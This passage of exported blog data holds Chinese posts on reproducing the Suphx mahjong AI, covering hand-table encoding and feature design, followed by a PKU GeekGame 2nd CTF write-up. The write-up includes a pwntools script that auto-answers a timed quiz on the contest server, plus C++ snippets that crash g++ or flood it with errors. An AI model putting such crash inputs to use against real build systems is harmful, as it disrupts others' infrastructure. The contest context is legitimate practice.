国士无双：所有幺九牌各一张，并且其中之一成对子\n\n七对和国士无双比较容易判定，但面子手的和牌形涉及到刻子、顺子、雀头的不同拆分，判定方法会比较麻烦。最容易想到的方法就是用dfs遍历所有的拆分可能性，如果能拆分完全，则满足面子手形状。曾经我也实现过这个算法，但dfs的问题在于时间复杂度不是很能接受。\n\n\n考虑一个用程序实现的麻将游戏，这个程序在什么时候会需要进行和牌的判定？实际上，在每一个玩家摸完牌之后，程序都需要为该玩家判定一次和牌；另外，当玩家切出一张牌时，程序都需要为其他三位玩家各判定一次和牌。因此，在一局20巡目左右的麻将游戏中，程序大约共需要进行至少20 \\* 4=80次和牌判定。另外，程序还需要为玩家判定一手牌是否听牌、是否可以立直等，显然这两者比和牌判定更为复杂。因此，dfs应该是在这个场合不可接受的算法。（后来发现可以通过维护每个玩家的听牌列表来减少这种和牌判定的次数，但这也同样会涉及到打听牌表）\n\n\n目前普遍用在各种网络麻将平台的判和算法是查表法。显然，麻将所有的和牌组合是有限的，因此查表法理论上可行，唯二需要解决的就是如何打表以及如何压缩表体积。\n\n经过一顿搜索，我查到了一种比较先进的打和牌表的算法：\n\n{% link 麻雀 和了判定,hp.vector.co.jp,http://hp.vector.co.jp/authors/VA046927/mjscore/mjalgorism.html %}\n\n虽然满篇的日文，但作为中国人还是能对其基本思路看懂个大概的/doge。\n\n\n简单而言，这种算法不关注每张牌具体是什么，而只关注牌之间的连续性。显然，若仅仅只判定是否形成和牌形状，「一万 二万 三万」和「二万 三万 四万」是没有任何区别的。\n\n\n该算法只捕获手牌之间的连续性特征，对手牌进行编码，连续的手牌将其枚数连续写在一起，不连续的手牌之间以0为分隔符。从网站中抄几个简单的例子凑一下篇幅：\n\n\n「１２３」→「１１１」  \n「５６７」→「１１１」  \n「１１１」→「３」  \n「３３３」→「３」  \n「２３４４５６」→「１１２１１」\n\n\n「１２３５６７一二三五六七西西」→「１１１０１１１０１１１０１１１０２」\n\n\n「１１１２３４６７８東東東西西」→「３１１１０１１１０３０２」\n\n\n「１１１２２２２３３３３４４４」→「３４４３」\n\n\n由此，我们可以将手牌转化为一串数字，称为这手牌的pattern，这串数字的特点是：每个数字介于0-4之间，并且不会连续出现两个0。\n\n\n接下来将这串数字按下面的规则编码为二进制串\n\n\n「１」→「０」  \n「２」→「１１０」  \n「３」→「１１１１０」  \n「４」→「１１１１１１０」  \n「１０」→「１０」  \n「２０」→「１１１０」  \n「３０」→「１１１１１０」  \n「４０」→「１１１１１１１０」\n\n\n则可以将手牌转化为一串01序列，这串二进制数就是被写进哈希表的内容。\n\n\n该算法在打表时还做了一个操作，即记录下该种pattern的一些信息，包含顺子数、刻子数、所有的面子在牌组中的位置，还有一些仅通过形状就能判定的役种：「一杯口」、「二杯口」、「七对子」、「一气通贯」、「九莲宝灯」。\n\n\n如此，打表的工作只剩下「如何遍历完全部的和牌pattern」，可以参考一下这份用ruby实现的[代码](http://hp.vector.co.jp/authors/VA046927/mjscore/ptn.rb)或者直接阅读我的项目代码中的[文件](https://github.com/windshadow233/Mahjong-AI/blob/main/mahjong/make_agari_table.py)。\n\n\n## 如何判定听牌\n\n\n当我们可以o(1)时间复杂度判定和牌后，应如何判定一手牌是否听牌？\n\n\n最直接的思路是，分别将34种牌插入手牌后计算其是否和牌。稍加优化，可以修改成只遍历手牌附近的牌（国士无双除外）。但感觉还是很浪费时间，稍后我们将其进行优化。\n\n\n## 如何判定立直\n\n\n当我们可以判定一手牌是否听牌后，应如何判定一手牌能不能立直？\n\n\n所谓「立直」，即若玩家处于「门前清」的状态下，通过打掉一张手牌就可以「听牌」时，可以做出的一种声明行为，「立直」之后，只能摸切直到和牌（一定条件下可以开暗杠）。\n\n\n因此，判断一手牌能不能立直，就要遍历所有手牌，看看将它切掉以后这手牌是否听牌，于是，如果使用前面那种未经过任何优化的听牌判断方法，最坏情况下判定一次立直就需要做34 \\* 14次和牌查表，然而这个查表并非严格意义上的常数时间，它还需要将手牌转化为pattern并编码，这样一来，考虑到立直判定在程序中的频繁发生（玩家在门前清状态下，每摸一次牌就需要判定一次），即使我们打了和牌表，仍会非常消耗时间。\n\n\n## 打听牌表\n\n\n用打和牌表的思路，我们也能打出一个听牌表。\n\n\n如何得到一个听牌的pattern？很简单，只要在和牌的pattern中去掉一张牌即可。\n\n\n例如，当和牌pattern是「3 3 3 3 2」的「四暗刻」形时，对应的听牌pattern就有以下五种：\n\n\n- 「2 3 3 3 2」\n- 「3 2 3 3 2」\n- 「3 3 2 3 2」\n- 「3 3 3 2 2」\n- 「3 3 3 3 1」\n\n然而问题仍未得到解决。考虑一手含有顺子的牌：「1 1 1 0 3 2」，它的听牌pattern有哪些？按去掉一张的思路，我们可以写出下面的几个pattern，似乎是其对应的听牌pattern：\n\n\n- 「1 1 0 3 2」\n- 「1 0 1 0 3 2」\n- 「1 1 1 0 2 2」\n- 「1 1 1 0 3 1」\n\n其中第1、3、4个都没有问题，唯独第2个pattern，这个pattern难道一定听牌了吗？显然不是，对于「1 0 1」这种形状，当且仅当这两个1对应的数牌相差2时才是听牌，并且是听嵌张。\n\n\n于是乎，原先的和牌表的编码方法需要修改思路。\n\n\n新的编码方式中，我们将额外记录一些数字相差2的嵌张的情况，当两张牌对应的数字相差2时，将其用0进行分隔；当两张牌对应的数字相差3及以上时（或不同字牌、不同类型），将其用00进行分隔。在这种编码方式下，下面几手牌的编码发生了一些变化\n\n\n「１２３５６７一二三五六七西西」→「１１１０１１１００１１１０１１１００２」\n\n\n「１１１２３４６７８東東東西西」→「３１１１０１１１００３００２」\n\n\n另外，转化为二进制序列的方法也要进行一些修改。考虑到0不会连续出现3次，我们可以这样编码：\n\n\n「０」→「０」  \n「１」→「１１０」  \n「２」→「１１１１０」  \n「３」→「１１１１１１０」  \n「４」→「１１１１１１１１０」  \n「１００」→「１１１０」  \n「２００」→「１１１１１０」  \n「３００」→「１１１１１１１０」  \n「４００」→「１１１１１１１１１０」\n\n\n这种编码方法不保证空间效率最高，主打一个能用就行！\n\n\n代码实现细节可以查看我的[项目文件](https://github.com/windshadow233/Mahjong-AI/blob/main/mahjong/make_agari_table_2.py)。\n\n\n通过这种编码方法得到的和牌pattern，只要移除一张牌，就能得到听牌pattern，由此打出听牌表。打听牌表的代码详见我的[项目文件](https://github.com/windshadow233/Mahjong-AI/blob/main/mahjong/make_machi_table.py)。\n\n\n在打出听牌表后，立直判定的查表次数减少了一个数量级（查10次左右听牌表即可），虽然感觉稍加修改也能打出一个立直表来，但意义不是很大，因为通常情况下我们还需要给出打哪几张牌可以立直，遍历手牌仍是不可或缺的。\n\n\n最终，我打出的和牌表与听牌表的体积分别为537 KB和845 KB。\n\n\n如此一来，游戏实现过程中最大的麻烦点 ~~（是吗？我怎么感觉实现游戏逻辑更麻烦）~~ 已经得到解决。\n","tags":["Mahjong AI","Suphx"],"categories":["机器学习"]},{"title":"从零开始的麻将AI论文复现（一）","url":"//blog/8437/","content":"\n这篇文章，我来介绍一下我对麻将局面信息的特征编码方法。\n\n首先，通过阅读论文，我们了解到Suphx在「弃牌模型」和「立直模型」中使用了通道多达838的特征，而「鸣牌模型」用到的特征更是多了120个通道。文中给出了一些比较基本的特征的编码方法，但对于这多达838个通道都是如何编码来的并未详细说明（~~其实是直接没说~~），不过，我们完全可以先做一个简化版的出来，日后再慢慢增加特征。\n\n![](https://oss.fyz666.xyz/blogfiles/png/72da0f46f977661511203bd79ce81f1f.png)\n\n## 手牌编码\n\n![](https://oss.fyz666.xyz/blogfiles/png/d2b42b88fd22c607bb4ca9a981418332.png)\n论文的图片已经很形象地说明了手牌的编码方法。该方法将手牌编码为4通道的34维向量，即形状为（4，34）的矩阵。首先将34种牌编码为0-33，当玩家手牌中拥有X张Y（0≤Y≤33）的时候，就将该矩阵第Y列的前X个元素置为1。\n\n\n为了编码的方便，我们可以为每个Agent维护一个手牌计数器，然后通过下面的函数即可生成编码：\n\n```python\ndef get_hand_tile_feature(self, counter):\n    \"\"\"\n    自家手牌\n    :param counter: Counter\n    :return: (4, 34)\n    \"\"\"\n    feature = np.zeros(shape=(4, 34))\n    upper_triangle = np.tril(np.ones(4))\n    for tile, c in counter.items():\n        if c > 0:\n            feature[:, tile] = upper_triangle[c - 1]\n    return feature\n```\n\n## 副露编码\n\n\n通过类似的方法，我们同样可以对玩家的副露进行编码，与手牌不同的是，副露是属于四个玩家均可见的牌，因此需要对四位玩家的副露都进行编码。我使用的编码方法如下：\n\n\n1. 每个副露使用与前面手牌相同的方法编码成形状为（4，34）的矩阵\n2. 每位玩家都预留4个副露的位置\n\n由此，每位玩家的副露需要16通道，四位玩家的副露则需要64通道。\n\n\n## 舍牌编码\n\n\n与手牌不同，玩家的舍牌是存在序列特性的，同样的舍牌在不同巡目被切出，所蕴含的意义截然不同。例如第一巡就切出的九万，大概率是个孤张，但在20巡左右手切出的九万，周围基本是有牌的。因此对舍牌的编码需要保留舍牌的顺序。考虑到每位玩家最大舍牌数为24，我们将每位玩家的舍牌编码为形状（24，34）的矩阵，每一行为一个onehot向量，表示该巡切出的舍牌编号（0-33）。\n\n\n因此，四位玩家的舍牌可以被编码为形状（96，34）的矩阵。\n\n\n## 场上所有可见牌的编码\n\n\n考虑到一些防守与做牌策略，场上每种牌出现过的次数是一个有用的特征，我们可以对其进行编码。\n\n\n基于此，我们可以维护一个计数器用来统计每种牌在全局可见的区域内出现过的次数，这些区域包括「四位玩家的牌河」、「四位玩家的副露区域」、「宝牌指示牌区域」。对每位玩家而言，可见牌还包括自己的手牌，因此，需要编码的可见牌信息为两个计数器之“和”，编码方法则与手牌一模一样，不再赘述。\n\n\n## 一些类别特征\n\n\n论文中提到了一些类别特征：\n\n> ...categorical features including round id, dealer, counters of repeat dealer, and Riichi bets.\n> \n> \n> ...\n> \n> \n> Categorical features are encoded into multiple channels, with each channel being either all 0’s or all 1’s.\n\n\n这些特征包含局数、亲家、连庄数（应该说本场数更为严谨）、立直棒数等。所有类别特征均被编码为全0或全1的通道，我的理解是：总类别数为N时的第n个类别，需要编码为一个（N，34）的全0矩阵，并把第n个通道全部置为1。\n\n```python\ndef get_category_feature(category, cat_num):\n    \"\"\"\n    类别特征\n    :return: (cat_num, 34)\n    \"\"\"\n    feature = np.zeros(shape=(cat_num, 34))\n    feature[category].fill(1)\n    return feature\n```\n\n我编码的类别特征以及类别数如下：\n\n\n| 类别特征 | 类别数 |\n| --- | --- |\n| 自家座位 | 4 |\n| 自家顺位 | 4 |\n| 局顺 | 16 |\n| 本场数 | 20 |\n| 场供（立直棒）数 | 20 |\n| 亲家座位 | 4 |\n\n共计68个通道。\n\n\n## 整数特征\n\n\n有一些信息以整数的形式存在，例如玩家的分数、剩余的牌数等。这些信息也会影响到玩家的决策，因此应该被编码进特征里。如论文中所述：\n\n> Integer features are partitioned into buckets and each bucket is encoded using a channel of either all 0’s or all 1’s.\n\n\n整数特征被分为了多个bucket，然后按类别特征进行编码。\n\n\n对于玩家的分数，我采用了每5000分一个bucket的形式，从5000分到45000分，共分为9个bucket。而剩余牌数以5、10、22、46为间隔分为5个bucket。\n\n\n## 其他特征\n\n\n此外我还编码了一些比较重要的信息：\n\n\n- 宝牌\n- 门风、场风\n- 四家的立直情况\n\n## 副露模型的额外特征\n\n\n对于「吃、碰、杠模型」，我额外为其添加了两个特征：\n\n\n- 鸣牌之后的手牌特征\n- 鸣牌之后自家的副露特征\n\n编码方法与前面提到的手牌、副露编码相同。\n\n\n这些所有特征共组成了288个通道，副露模型则额外增加22个通道，与论文描述的838通道、958通道相差甚远。值得一提的是，论文中提到了一个前瞻特征（look-ahead feature）：\n\n> In addition to the directly observable information, we also design some look-ahead features, which indicate the probability and round score of winning a hand if we discard a specific tile from the current hand tiles and then draw tiles from the wall to replace some other hand tiles.\n> \n> \n> ...we make several simplifications while extracting look-ahead features: (1) We perform **depth first search** to find possible winning hands. (2) We ignore opponents’ behaviors and only consider drawing and discarding behaviors of our own agent. With those simplifications, we obtain 100+ look-ahead features, with each feature corresponding to a 34-dimensional vector. For example, a feature represents whether discarding a specific tile can lead to a winning hand of 12,000 round score with replacing 3 hand tiles by tiles drawn from the wall or discarded by other players.\n\n\n这一系列特征我还没有进行设计（另外，由于这些特征的构建需要用到dfs，是否会对训练速度有较大的影响？）希望能有大佬指点迷津。\n\n\n至此，特征的构建已基本完成，虽然特征通道数远远小于论文所写，但对于我们想复现的迷你版模型而言，或许已经足够了，这样一来，监督学习所需要的要素已经收集完全。\n\n\n由于科研繁忙，对于Suphx论文中提到的强化学习算法的复现计划得暂时往后放一放了（但写几篇博客的时间还是有的），后面的文章中，我应该会先写一些杂七杂八的项目实现中的细节问题。\n","tags":["Mahjong AI","Suphx","深度学习"],"categories":["机器学习"]},{"title":"从零开始的麻将AI论文复现（零）","url":"//blog/8394/","content":"\n前段时间，博主突然开始~~沉迷~~偶尔玩玩立直麻将，受自己“职业病”的影响，遂想着能不能搞个AI出来~~帮我上段~~。\n\n先找找有没有现成的算法。上网一搜，发现果然早有不少麻将AI的算法诞生了，比如东京大学开发的「爆打」、由Dwango发布的「NAGA25」、由MSRA开发的「Suphx」等。看了一圈，决定试着复现一下「Suphx」。\n\n![](https://oss.fyz666.xyz/blogfiles/webp/29e543a6dc692da86719057ab0006738.webp)\n## 论文简介\n\n论文传送门如下：\n\n{% link Suphx: Mastering Mahjong with Deep Reinforcement Learning,arXiv,https://arxiv.org/abs/2003.13590 %}\n\n如论文所说，该算法仅在监督学习下就能达到人类顶级水平，而在self-play以及reinforcement learning算法的加持下，Suphx能够达到特上房的最高段位十段，其稳定段位更是能达到8.7段，远超人类高手的稳定段位：7.4段。\n\n\nSuphx并没有开源代码，因此唯一能参考的只有MSRA的研发团队放到arXiv上的这篇论文（当然还有众多鱼龙混杂的解读文），然而该论文写的比较简略，有许多细节并未阐述，大概是MSRA的大佬们认为这些都是简单易得的。在这些尚未拨开云雾的细节问题上，就需要发挥自己的想象力了。\n\n\n这篇论文复现起来应该是一个大工程，因此本系列将会持续更新，~~直到我复现失败或者不想玩了为止~~。\n\n\n通过阅读论文，容易发现Suphx首先是通过监督学习进行训练的，为的是使得模型快速习得麻将的复杂规则。Suphx是由多个模型组合而成的一个决策模型，这些子模型分别是「弃牌模型」、「立直模型」、「吃模型」、「碰模型」、「杠模型」以及「和牌模型」。其中「和牌模型」比较简单，使用了基于规则的算法（我在复现时更是直接采用了能和就和的zz策略），而其他模型则都使用了残差卷积神经网络结构。例如：「弃牌模型」输入当前局面的编码，输出一个34维向量（立直麻将共有34种牌），这个向量即表示模型的切牌倾向，选择argmax对应的牌切出即可。而「吃、碰、杠、立直模型」则都是二分类模型，输出2维向量（或一个标量）表示模型在决策上的倾向。\n\n\n## 我的成果\n\n\n在开始写这篇文章时，我已基本复现完成监督学习的部分，并且AI确实已经有点能打了（我本人和三个经监督学习的AI打了多个半庄，感觉吃1比较困难，<s>当然这个不排除我自己比较菜的可能</s>）。下面贴出一些AI的“战绩”<s>以及我疏于防守然后被AI击飞的冥场面</s>。可见仅仅经过非常有限的监督学习后的AI，已经相当有做牌思路了。\n\n{% hideToggle 一些截图, lightblue %}\n\n{% gallery %}\n![](https://oss.fyz666.xyz/blogfiles/png/e83235871592999667d40752c2b3b347.png)\n\n![](https://oss.fyz666.xyz/blogfiles/png/c7a80ce1c3d7e446a7e70455fa61fb08.png)\n\n![](https://oss.fyz666.xyz/blogfiles/png/5752a024f3e4e288d578133361eed79c.png)\n\n![](https://oss.fyz666.xyz/blogfiles/png/59a90ec85e31a63fb07b3f7e6f8bc6bd.png)\n\n![](https://oss.fyz666.xyz/blogfiles/png/091a2a6199e0066c3b5533d6509897c4.png)\n\n![](https://oss.fyz666.xyz/blogfiles/png/c46896929cf41806d952b1923362417a.png)\n\n![](https://oss.fyz666.xyz/blogfiles/png/c22402af86f5ee7e8fe123fe5b943e82.png)\n\n![](https://oss.fyz666.xyz/blogfiles/png/96557585bc10500999c416f1e5bae4d0.png)\n\n![](https://oss.fyz666.xyz/blogfiles/jpg/267317fdec929b24aa0aec8e282bf718.jpg)\n\n{% endgallery %}\n\n{% endhideToggle %}\n\n---\n\n若您想对此辣鸡模型的效果有更加直观的认识，可以通过访问[这个链接](https://suphx.fyz666.xyz/)观看模型的self-play（暂时关闭）。\n\n\n作为本系列的第一篇文章，本文就先简简单单写一下监督学习的数据集的来源与处理。\n\n\n## 数据来源与处理\n\n\nSuphx的监督学习数据来源于最高水平立直麻将平台[「天鳳」](https://tenhou.net/)，为了提升数据质量，减少数据噪声，采用了天鳳平台凤凰桌的对局数据。一个典型的天鳳牌谱格式为XML，牌谱中具体的标签含义可以查看[这篇文章](https://notoootori.github.io/2020/07/28/%E5%A4%A9%E5%87%A4%E7%89%8C%E8%B0%B1%E9%87%87%E9%9B%86%E5%8F%8A%E5%88%86%E6%9E%90.html)，其已写的非常详细。我们可以通过遍历牌谱文件来回放对局，因此首先需要编写一个麻将游戏的class，简单实现一下所有需要的游戏接口。由于游戏实现并非本文的重点，这里省略，可以直接参考[我的项目代码](https://github.com/windshadow233/Mahjong-AI)，后文可能会对一些细节进行说明。\n\n\n由牌谱生成数据的方法非常简单，牌谱XML文件中的每一个节点均表示一个游戏中的事件，如“某玩家摸进一张一饼”、“某玩家开了个白板的暗杠”、“翻了一张新dora指示牌：三万”等等，我们只要遍历XML文件的所有节点，节点在干啥，我们就干啥，这样即可对一个牌谱进行playback。以训练「弃牌模型」所需要的数据为例，我们首先确定一个观察目标（比如整个半庄结束后的胜利玩家），在遍历到该玩家的弃牌行为节点时，将当前局面编码为特征，同时将该玩家所弃的牌作为标签，我们由此就可以得到一系列的（特征，标签）对。\n\n\n牌谱中比较难处理的是标签为“N”的节点，该标签表示一次鸣牌，然而鸣牌被记录为了人看不懂的形式，例如“<N who=\"1\" m=\"3495\"/>”，这其实是天鳳平台对鸣牌进行了编码，可以参考[天鳳の牌譜形式态解析](https://blog.kobalab.net/entry/20170228/1488294993)这篇文章或直接阅读[天鳳的代码](http://tenhou.net/img/tehai.js)。\n\n\n下一篇文章将说明我自己对游戏局面进行编码的方法。\n","tags":["Mahjong AI","Suphx","深度学习"],"categories":["机器学习"]},{"title":"PKU GeekGame 2nd 部分题目Write-Up","url":"//blog/8100/","content":"\nGeekGame 2nd结束了，今年的题没有了去年那种套娃，难度有所下降，总体感觉不错，也取得了比去年更高的总排名（29），对一名非专业菜鸟玩家而言，我已经相当满意。\n\n更重要的是，我在解题过程中学到了不少东西，也获得了不少乐趣，而不是像去年那样晕头转向没有方向感。\n\n{% link 本次比赛的官方存档,GitHub,https://github.com/PKU-GeekGame/geekgame-2nd %}\n\n## †签到†\n\n去年的签到我想了半个小时，今年只用了20秒。别问，问就是一模一样，见[去年的题解](/blog/7311/)。~~（PKU GeekGame的出题人怎么不在签到题上点心。~~ 官方题解出来后发现其实和去年的签到是有区别的，这次的PDF用某些阅读器打开会发现无法复制，然而我是用Chrome的沙拉查词插件带的PDF阅读器打开的，因此不受影响。\n\n[本题附件](https://github.com/PKU-GeekGame/geekgame-2nd/raw/master/official_writeup/signin/attachment/prob19.pdf)\n\n## 小北问答 · 极速版\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n菜宝十分擅长网上冲浪，会使用十种甚至九种搜索引擎。本届 PKU GeekGame 一开始，她就急不可耐地打开了小北问答题目，想要在一血榜上展现她惊人的情报搜集能力。\n\n\n为了让菜宝玩得开心，小北问答题目全新升级为小北问答 · 极速版。\n\n\n小北问答 · 极速版自带省流助手，基于 socket 通信的纯文字 UI 简洁朴实，不浪费网络上的每一毫秒。\n\n\n小北问答 · 极速版自带速通计时，只有手速够快的 CTF 选手才是好的 CTF 选手。\n\n\n小北问答 · 极速版自带肉鸽玩法，每次连接到题目都有不一样的问题在等着你。\n\n\n赶紧打开网页终端体验小北问答 · 极速版，把 Flag 抱回家吧！\n\n{% endnote %}\n{% endhideToggle %}\n与以往的问答题不同，这次问答平台提供的是一个终端，经多次尝试，发现共有以下8道题：\n\n{% hideToggle 展开题目 %}\n{% note primary simple %}\n1. 北京大学某实验室曾开发了一个叫 gStore 的数据库软件。最早描述该软件的论文的 DOI 编号是多少？  \n**答案格式：^[\\d.]+\\/[\\d.]+$**\n2. 我刚刚在脑海中想了一个介于 a 到 b 之间的质数。猜猜它是多少？  \n**答案格式：^\\d+$**\n3. 访问网址 “[http://ctf.世界一流大学.com](http://ctf.世界一流大学.com)” 时，向该主机发送的 HTTP 请求中 Host 请求头的值是什么？  \n**答案格式：^[^:\\s]+$**\n4. 支持 WebP 图片格式的最早 Firefox 版本是多少？  \n**答案格式：^\\d+$**\n5. 每个 Android 软件都有唯一的包名。北京大学课外锻炼使用的最新版 PKU Runner 软件的包名是什么？  \n**答案格式：^[a-z.]+$**\n6. 我有一个朋友在美国，他无线路由器的 MAC 地址是 d2:94:35:21:42:43。请问他所在地的邮编是多少？  \n**答案格式：^\\d+$**\n7. 视频 bilibili.com/video/BV1EV411s7vu 也可以通过 bilibili.com/video/av_____ 访问。下划线内应填什么数字？  \n**答案格式：^\\d+$**\n8. 在第一届 PKU GeekGame 比赛的题目《电子游戏概论》中，通过第 n 级关卡需要多少金钱？  \n**答案格式：^\\d+$**\n{% endnote %}\n{% endhideToggle %}\n其中，第2题的a与b为比较随机的10位数，第8题的n也是一个动态变化的值。\n\n\n对于每一题，我的解题思路如下：\n\n\n1. 找到这个软件的[github仓库](https://github.com/pkumod/gStore)，在Readme文件中找到[Related Essays](https://github.com/pkumod/gStore/blob/1.0/docs/ESSAY.md)，可知最早的相关论文是\"gStore: answering SPARQL queries via subgraph matching\"，通过crossref搜索得到[此结果](https://search.crossref.org/?from_ui=&q=gStore%3A+Answering+SPARQL+Queries+Via+Subgraph+Matching)。答案：10.14778/2002974.2002976\n2. Python的sympy库可以直接寻找nextprime，经测试，a和b中间一般有8个质数，使用大数定律即可解决此问。\n3. 打开浏览器的开发者工具，然后访问[http://ctf.世界一流大学.com](http://ctf.世界一流大学.com)，可以抓到数据包，查看request header中的Host值即可。答案：ctf.xn--4gqwbu44czhc7w9a66k.com\n4. 谷歌一下即可。答案：65\n5. 搜索pku runner，发现最新版本的[下载链接](https://pkunewyouth.pku.edu.cn/public/apks/pkurunner-latest.apk)。在Linux上使用命令：`aapt dump badging pkurunner-latest.apk |grep package`，即可找到包名。答案：cn.edu.pku.pkurunner\n6. 不会，但根据二阶段的提示容易找到答案为80304\n7. 搜索 bv转av，搜到[工具](http://www.atoolbox.net/Tool.php?Id=910)。答案：418645518\n8. 找到相关题目的[源码](https://github.com/PKU-GeekGame/geekgame-1st/blob/master/src/pygame/game/server/libtreasure.py)，容易发现计算每一关目标金钱的函数：`GOAL_OF_LEVEL = lambda level: 300+int(level***1.5)**100`\n\n虽然有一题不会，但由于每次只从题库中随机7题，那么仍有概率可以全部做对。题目还要求在3秒内完成作答，因此使用pwntools。下面为解题代码：\n\n\n\n```python\nimport random\nimport pwn\nimport sympy\nimport re\n\nGOAL_OF_LEVEL = lambda level: 300+int(level**1.5)*100\nr = pwn.remote('prob01.geekgame.pku.edu.cn', 10001)\nr.recvuntil(b'Please input your token:')\nr.sendline(b'0:this_is_my_token')\nprint(r.recvuntil('输入“急急急”开始答题。\\n>'.encode('utf-8')).decode('utf-8'))\nr.sendline('急急急'.encode('utf-8'))\nr.recvuntil('\\n计时开始。\\n'.encode('utf-8'))\n\nfor i in range(7):\n    q = r.recvuntil(b'>').decode('utf-8')\n    print(q)\n    if '世界一流大学' in q:\n        r.sendline(b'ctf.xn--4gqwbu44czhc7w9a66k.com')\n    elif 'Android' in q:\n        r.sendline(b'cn.edu.pku.pkurunner')\n    elif 'bilibili' in q:\n        r.sendline(b'418645518')\n    elif 'gStore' in q:\n        r.sendline(b'10.14778/2002974.2002976')\n    elif 'Firefox' in q:\n        r.sendline(b'65')\n    elif '质数' in q:\n        p1, p2 = re.findall(r'\\d{8,}', q)\n        p1 = int(p1)\n        p2 = int(p2)\n        maybe_ans = []\n        ans = sympy.nextprime(p1)\n        while ans < p2:\n            maybe_ans.append(ans)\n            ans = sympy.nextprime(ans)\n        r.sendline(str(maybe_ans[3]).encode())\n    elif '电子游戏' in q:\n        level = int(re.findall(r'通过第 (\\d+) 级', q)[0])\n        r.sendline(str(GOAL_OF_LEVEL(level)).encode())\n    elif 'MAC' in q:\n        ans = f\"{random.randint(0, 99999):05}\"\n        r.sendline(ans.encode())\n    res = r.recvline().decode('utf-8')\n    print(res)\n    if '不' in res:\n        r.close()\n        break\nelse:\n    while 1:\n        try:\n            print(r.recv().decode())\n        except EOFError:\n            break\n\n```\n\n只要多逝亿下就可以拿到flag~。在有了二阶段的第6题提示后，只要多试一下就能拿flag了。\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/41303a6fbe886ae315d00f835fe035e7.png)\n## 编原译理习题课\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n一个测试工程师走进一家酒吧，要了一杯啤酒。\n\n\n一个测试工程师走进一家酒吧，要了一杯咖啡。\n\n\n一个测试工程师走进一家酒吧，要了 0.7 杯啤酒。\n\n\n一个测试工程师走进一家酒吧，要了-1 杯啤酒。\n\n\n一个测试工程师走进一家酒吧，要了一份雪王大圣代和冰鲜柠檬水。\n\n\n一个测试工程师走进一家酒吧，对核验健康宝的店员出示了舞萌 DX 玩家二维码。\n\n\n一个测试工程师走进一家酒吧，打开了 PKU GeekGame 比赛平台。\n\n\n一个测试工程师走进一家酒吧，用 g++ 编译他的代码。\n\n\n酒吧没炸，但 g++ 炸了。\n\n\n你知道多少种让 g++ 爆炸的姿势呢？快来大显身手吧。\n\n\n让 g++ 编译出的程序超过 8MB 可以获得 Flag 1\n\n\n让 g++ 输出的报错信息超过 2MB 可以获得 Flag 2\n\n\n让 g++ 因为段错误而崩溃 可以获得 Flag 3\n\n\n\n[本题附件](https://github.com/PKU-GeekGame/geekgame-2nd/raw/master/official_writeup/gcc/attachment/prob04.zip)\n{% endnote %}\n{% endhideToggle %}\n\n### flag1\n\n\n非常简单，唯一一个我自己就会做的flag。只要在程序里定义一个很大的全局变量就好了。\n\n\n\n```cpp\nchar const bigarray[8*1024*1024] = {1};\nint main(){return 0;}\n```\n\nflag{nOt-much-LargEr-than-an-electron-apP}\n\n\n\n### flag2\n\n\n搜索 g++ huge error log，搜到[相关内容](https://stackoverflow.com/questions/54004610/why-does-g-generate-huge-error-log)。发现下面代码可以拿到flag2：\n\n\n\n```cpp\nstruct x struct z<x(x(x(x(x(x(x(x(x(x(x(x(x(x(x(x(x(x(x(x(y,x(y><y*,x(y*w>v<y*,w,x{}\n```\n\nflag{shorT volatile program; long loNg mesSagE;}\n\n\n\n### flag3\n\n\n搜索 g++ crash，搜到[此网页](https://gcc.gnu.org/bugzilla/show_bug.cgi?id=54080)。在里面找到一段代码，亲测可行：\n\n\n\n```cpp\ntemplate <class T>\nclass vector{};\ntemplate <template <typename U> class Container,typename Func>\nvector<int> foo(const Container<int>& input, const Func &func){}\ntemplate <template <typename U> class OutType,typename Func1,typename FuncRest>\nauto foo(const vector<int> &input, const Func1 &func1, const FuncRest funcrest) -> decltype(foo<vector>(foo(input, func1), funcrest))\n{return;}\nint main()\n{\n    vector<int> v1;\n    foo<vector>(v1, 1, 1);\n}\n```\n\nflag{soRry-to-inform-you-thAt-gnu-Is-not-uniX}\n\n\n\n对于可以直接搜到答案的题，我觉得很迷惑，但，真香（\n\n\n## Flag Checker\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n我们发现，有很多选手在比赛中提交了错误的 Flag。\n\n\n为了防止这种情况发生，给选手良好的参赛体验，这里有一个简单的 Java 程序。\n\n\n你可以在程序里面输入要提交 Flag ，程序会帮你检查 Flag 是否正确。\n\n\n是不是非常的贴心呢？\n\n\n提醒：JRE 版本高于 15 时可能无法运行此程序。建议使用 JRE 8 运行。\n\n\n\n[本题附件](https://github.com/PKU-GeekGame/geekgame-2nd/raw/master/official_writeup/javarev/attachment/prob15.jar)\n{% endnote %}\n{% endhideToggle %}\n看到题，发现是Java，跳过（我不会Java\n\n\n过了两三天，发现别的题不太会了，于是来看这题。根据提醒装了下JRE 8，然后试了几个Java反编译程序，最后用luyten解决了。\n\n\n反编译出来的代码如下：\n\n\n\n```java\nimport java.awt.*;\nimport java.io.*;\nimport javax.swing.*;\nimport javax.script.*;\nimport java.awt.event.*;\nimport java.util.*;\n\npublic class GeekGame extends Frame implements ActionListener\n{\n    TextField textField1;\n    Button button1;\n    Button button2;\n    Invocable invocable;\n    \n    GeekGame() {\n        this.setSize(300, 300);\n        this.setVisible(true);\n        this.setLayout(new BoxLayout(this, 1));\n        final Label label = new Label(\"Flag: \");\n        this.textField1 = new TextField(\"flag{...}\");\n        (this.button1 = new Button(\"Check Flag 1\")).addActionListener(this);\n        (this.button2 = new Button(\"Check Flag 2\")).addActionListener(this);\n        this.add(label);\n        this.add(this.textField1);\n        this.add(this.button1);\n        this.add(this.button2);\n        final ScriptEngine engineByName = new ScriptEngineManager().getEngineByName(\"nashorn\");\n        try {\n            final String s = 